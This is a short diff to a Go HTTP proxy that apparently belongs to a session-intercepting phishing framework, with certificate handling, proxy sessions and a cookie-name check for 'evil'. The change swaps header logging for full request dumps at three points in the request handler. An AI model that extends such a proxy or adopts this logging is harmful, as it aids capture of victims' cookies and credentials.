@@ -157,8 +157,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	p.Proxy.OnRequest().
 		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
-			log.Info("Request Headers: %v", req.Header)
-			
+			log.Info("Request Before: %v", req)
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -622,7 +621,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-				
+				log.Info("Request B4 Checkers: %v", req)
 				//Checkers
 				// Define the substring to check for in cookie names
 			        substringToCheck := "evil"
@@ -900,7 +899,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 				}
-			log.Info("Request: %v", req)
+			log.Info("Request After: %v", req)
 			return req, nil
 		})
 
